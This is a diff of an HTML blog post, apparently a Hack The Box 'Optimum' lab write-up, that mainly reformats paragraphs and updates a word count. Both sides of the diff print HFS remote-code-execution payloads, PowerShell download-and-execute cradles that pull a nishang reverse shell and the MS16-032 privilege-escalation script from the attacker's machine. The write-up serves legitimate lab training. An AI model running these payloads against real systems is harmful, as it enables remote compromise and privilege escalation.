@@ -46,7 +46,7 @@ masscan -e tun0 -p0-65535,U:0-65535 10.10.10.8 --rate=1000 Starting masscan 1.0.
 
 <meta itemprop="datePublished" content="2019-06-18T22:00:00&#43;07:00" />
 <meta itemprop="dateModified" content="2019-06-18T22:00:00&#43;07:00" />
-<meta itemprop="wordCount" content="462">
+<meta itemprop="wordCount" content="477">
 
 
 
@@ -171,17 +171,27 @@ execute arbitrary programs via a %00 sequence in a search action.
 
 <p><img src="/img/optimum_3.png" alt="Optimum_3" /></p>
 
-<p>I&rsquo;m going to use this payload to test the RCE <code>?search=%00{.exec|ping+10.10.14.45.}</code>. And then when running tcpdump, we got a response from the Box!</p>
+<p>I&rsquo;m going to use this payload to test the RCE <code>?search=%00{.exec|ping+10.10.14.45.}</code>. You can read more about why I use that payload <a href="https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands" target="_blank">here</a>.</p>
+
+<p>And then when running tcpdump, we got a response from the Box!</p>
 
 <p><img src="/img/optimum_4.png" alt="Optimum_4" /></p>
 
 <p>Sweet! Now we know that our RCE really work, let&rsquo;s create a powershell shell to communicate with the box! I&rsquo;m going to use <a href="https://github.com/samratashok/nishang" target="_blank">nishang</a> <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">Invoke-PowerShellTcp.ps1</a> here. Don&rsquo;t forget to add <code>Invoke-PowerShellTcp -Reverse -IPAddress Your_IP -Port Your_Port</code> by the end of the file.</p>
 
-<p>And then because most of Hack The Box boxes is made from 64 bit machine, I&rsquo;m assuming this one too. So let&rsquo;s try to call the 64 bit powershell and then ping our machine back with this payload <code>?search=%00{.exec|C%3a\Windows\Sysnative\WindowsPowershell\v1.0\powershell.exe+ping+10.10.14.45.}</code>. And yeah, don&rsquo;t forget to url encode our payload!</p>
+<p>And then because most of Hack The Box boxes is made from 64 bit machine, I&rsquo;m assuming this one too. So let&rsquo;s try to call the 64 bit powershell and then ping our machine back with this payload</p>
+
+<p><code>?search=%00{.exec|C%3a\Windows\Sysnative\WindowsPowershell\v1.0\powershell.exe+ping+10.10.14.45.}</code></p>
+
+<p>And yeah, don&rsquo;t forget to url encode our payload!</p>
 
 <p><img src="/img/optimum_5.png" alt="Optimum_5" /></p>
 
-<p>Nice! We got response from the box, turns out my assumption was right about this box being a 64 bit. Now let&rsquo;s try to call our nishang shell. I&rsquo;ll start by running webserver from my box and then let the box download the <code>.ps1</code> script, this is the payload that I use <code>?search=%00{.exec|C%3a\Windows\Sysnative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadstring('http%3a//10.10.14.45/Invoke-PowerShellTcp.ps1').}</code>.</p>
+<p>Nice! We got response from the box, turns out my assumption was right about this box being a 64 bit. Now let&rsquo;s try to call our nishang shell.</p>
+
+<p>I&rsquo;ll start by running webserver from my box and then let the box download the <code>.ps1</code> script, this is the payload that I use</p>
+
+<p><code>?search=%00{.exec|C%3a\Windows\Sysnative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadstring('http%3a//10.10.14.45/Invoke-PowerShellTcp.ps1').}</code></p>
 
 <p><img src="/img/optimum_6.png" alt="Optimum_6" /></p>
 
@@ -191,11 +201,23 @@ execute arbitrary programs via a %00 sequence in a search action.
 
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 
-<p>Privilege escalation is pretty straight forward from here. Let&rsquo;s start by enumerating the system, in here I&rsquo;m going to use <a href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1" target="_blank">Sherlock</a> to enumerate the system. Don&rsquo;t forget to add <code>Find-AllVulns</code> by the end of the code. Because our shell is already a powershell, I&rsquo;m going to use this command to download the <code>.ps1</code> script from my system. <code>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/Sherlock.ps1')</code></p>
+<p>Privilege escalation is pretty straight forward from here. Let&rsquo;s start by enumerating the system, in here I&rsquo;m going to use <a href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1" target="_blank">Sherlock</a> to enumerate the system. Don&rsquo;t forget to add <code>Find-AllVulns</code> by the end of the code.</p>
+
+<p>Because our shell is already a powershell, I&rsquo;m going to use this command to download the <code>.ps1</code> script from my system.</p>
+
+<p><code>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/Sherlock.ps1')</code></p>
 
 <p><img src="/img/optimum_8.png" alt="Optimum_8" /></p>
 
-<p>From here, <code>Sherlock</code> indicating that this box appeared to be vulnerable to <code>MS16-032 Secondary Logon Handle Privilege Escalation</code>. From here I&rsquo;m going to use <a href="https://github.com/EmpireProject/Empire" target="_blank">Empire</a> <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1" target="_blank">Invoke-MS16032.ps1</a> script. Don&rsquo;t forget to add <code>Invoke-MS16032 -Command &quot;IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/sh.ps1')&quot;</code> by the end of the script. I&rsquo;m going to use this payload to run the <code>Empire</code> script, <code>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/Invoke-MS16032.ps1')</code>.</p>
+<p>From here, <code>Sherlock</code> indicating that this box appeared to be vulnerable to <code>MS16-032 Secondary Logon Handle Privilege Escalation</code>.</p>
+
+<p>Because of that, I&rsquo;m going to use <a href="https://github.com/EmpireProject/Empire" target="_blank">Empire</a> <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1" target="_blank">Invoke-MS16032.ps1</a> script.</p>
+
+<p>Don&rsquo;t forget to add <code>Invoke-MS16032 -Command &quot;IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/sh.ps1')&quot;</code> by the end of the script.</p>
+
+<p>I&rsquo;m going to use this payload to run the <code>Empire</code> script on the box.</p>
+
+<p><code>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/Invoke-MS16032.ps1')</code>.</p>
 
 <p><img src="/img/optimum_9.png" alt="Optimum_9" /></p>
 
@@ -213,7 +235,7 @@ execute arbitrary programs via a %00 sequence in a search action.
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="/tags/hack-the-box">Hack the box</a></span><span class="tag"><a href="/tags/writeup">Writeup</a></span>
                 </p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>462 Words</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>477 Words</p>
 
             <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2019-06-18 22:00 &#43;0700</p>
         </div>
